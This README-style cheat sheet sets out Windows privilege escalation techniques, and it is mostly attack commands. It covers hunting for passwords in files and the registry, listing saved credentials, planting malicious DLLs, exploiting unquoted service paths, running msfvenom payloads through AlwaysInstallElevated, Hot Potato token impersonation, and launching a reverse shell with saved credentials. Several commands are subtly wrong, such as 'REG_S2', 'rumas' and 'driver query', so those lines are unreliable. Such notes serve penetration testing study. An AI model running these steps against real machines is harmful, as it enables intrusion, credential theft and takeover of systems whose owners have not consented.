<h1 align="center">Windows-Privilage-Escalation</h1>

## 1.Enumeration

`whoami /priv`-Current user privilages  

`net user (username)`-List details of the user  

`qwinsta`-Show other users logged in simultaneously  

`net localgroup`-Usergroups defined on the system  

`net localgroup (localgroup)`-List members of specific group  
#### System information
`systeminfo`-Overview of the target system  
Show Filtered output of above command-  
```bash
`systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```
`hostname`-r

#### Finding files

```bash
findstr /si password *.txt
```
`findstr`-searchs for patterns in files
  
`/si`-current directory and sub directory

`password`-searchs for string passowrd in files  
`*.txt`-cover files with txt extension  

#### Patch level
To list updates installed-
```bash
wmic qfe get Caption,Description,HotFixID,InstalledOn
``` 
#### Network connection
Shows all the listning ports of the system-
```bash
netstat -ano
```
`a`-all active connections
`n`-prevents name resolution
`o`-process ID

#### Scheduled tasks
To query scheduled tasks-
```bash
schtasks /query /fo LIST
```
#### Drivers
`driver query`-lists drivers installed on the system  

#### Antivirus
`sc query (process name)`-find processes with name  
`windefend`-service name for windows defender  
`sc queryex type=service`-query for services  

## Tools of trade
#### [WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)

#### [PowerUp](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)
  
`Invoke-AllChecks`-perform all possible checks  

`Get-UnquotedService`-only look for potential inquoted service path vulnerablities
  
`Import-Module .\PowerUp.ps1`-run script 

#### Windows exploit suggester
Use-
```bash
windows-exploit-suggester.py --database (database) ---systeminfo (file)
```
`file`-file with output of systeminfo command

#### Metasploit
```bash
multi/recon/local_exploit_suggester
```

## Vulnerable software
`wmic (product)`-information about the product on the system  
filtered version of the above command -
```bash
wmic product get name,version,vendor
```

`wmic service list brief`- check for running services
filtered version of the above command-
```bash
wmic service list brief | findstr "Running"
```
`sc qc (service name)`-find more information about the service (Ie: state,location)

## DLL hijacking

`c:\Windows\System32`-stores all the dll files essential for the system to run  
#### DLL searching algorithm
- **If SafeDLLSearchmode ON**
1. Directory form where the application has been loaded
2. System directory - `GetSystemDirectory`
3. 16bit system directory
4. Windows Directory - `GetWindowsDirectory`
5. Current directory
6. Directories listed in path variables
  
- **If SafeDLLSearchmode OFF**
1. Directory form where the application has been loaded
2. Current directory
3. System directory
4. 16bit system directory
5. Windows directory
6. directories listed in path variables

**ProcMon** - Tool to find potential Dll hijacking vulnerablities but requires root privs to install  

We need to compile a c code to a dll file with the command we want to run on the system with root privs and then place the dll file in the loaction where it is accesible to the service and we have write privilages to the folder.  
**Code available** [HERE](./Skeleton_code_for_malicious_dll.c)
we need to compile this code on the attacker machine.  
```bash
x86_64-w64-mingw32-gcc (code to be comiled) -shared -o output.dll
```
>- We need to transfer the compiled dll file to the target machine  
> To do this we need to start python server and then download the file using `wget -o (name of the file) (IP):(Port)/(filename.dll)`

place the file according to the algorithm stated above and your write permissions  
Now restart the service using -`sc stop (service) & sc start (service)`  
to check the state of the service -`sc query (service)`  

Command to change the password of the user-   
```bash
NET USER (username) (new password)
```

## Unquoted service path
- To exploit a unquoted service path vulnerablity we need to have the write permission on the folder where the service is going to check for the executable  

- Conditions of a successful exploit-
1. Being able to write to a folder on the path
2. Being able to restart the service

to list services running on the target system-
```bash
wmic service get name,displayname,pathname,startmode
```

to check binary path of the service- `sc qc (service)`  

(If accesschk64.exe is available)Check for writable folders- 
```bash
.\accesschk.exe /accepteula -uwda "C:\Program Files\"
```
Now we have to make the payload using Msfvenom then set up multi/handler and then transfer the payload to the machine by setting up a python server  
Make sure to change the name of the payload to the required one   
last step is to restart the service so that the payload can be executed  
`sc start (service)`

## Token Impersonation

`SeImpersonatePrivilage`-privilage that was restricted to NT-Auth in 2019

- Diffrent exploit exist for this vulnerablity-
1. Hot potato
2. Rotten potato
3. Juicy Potato
4. Lonely potato

#### Hot potato 
**Steps:**
1. target system uses the Web-proxy-auto-discover protocol its update server
2. request is intercepted by the exploit and sends a response redirecting the target to 127.0.0.1
3. Then the target will ask for a proxy config file (wpad.dat)
4. a malicious dat file will be sent to the target 
5. target tries to connect to the proxy (sent by the exploit in the privious step)
6. exploit asks target to perform a NTLM authentication
7. target sends the NTLM handshake
8. handshake recived is relayed to the SMB service with the request to create a process, this process will have privilage level of the service targeted,which would typically be "NT-Authority".  
![alt ](./images/HP.png "This photo is taken from Jorge Lajara personal blog")

**MS16-075**-Update to mitigate this exploit

## Quick winns

#### Scheduled tasks
`schtasks`-to list scheduled tasks

#### Alwaysinstallelevated

- Method requires 2 registory values to be set. We can query them using below commands-
```bash
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
and 
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```
If both set then generate a .msi file from msfvenom and also initialise the multi/handler  
Move the file to the target machine and run the installer-
```bash
msiexec /quiet /qn /i (path to the file)
```

#### Passwords
**Saved credentials**
  
`cmdkey /list`-to show the saved creds
*if found any creds worth trying then*
```bash
rumas /savecred /user:(admin) reverse_shell.exe
```
  
**Registry keys**
  
Registry keys containing passwords can be queried using the commands below-
```bash
reg query HKLM /f password /t REG_S2 /s
and
reg query HKCU /f password /t REG_S2 /s
```

**Unattended files**
  
*Unattended.xml files are used by the system admins to set up the system according to them and these files can be found on the system if bychance the sysadmins forget to delete it after the completion of there work.*
*These files are worth reading*

















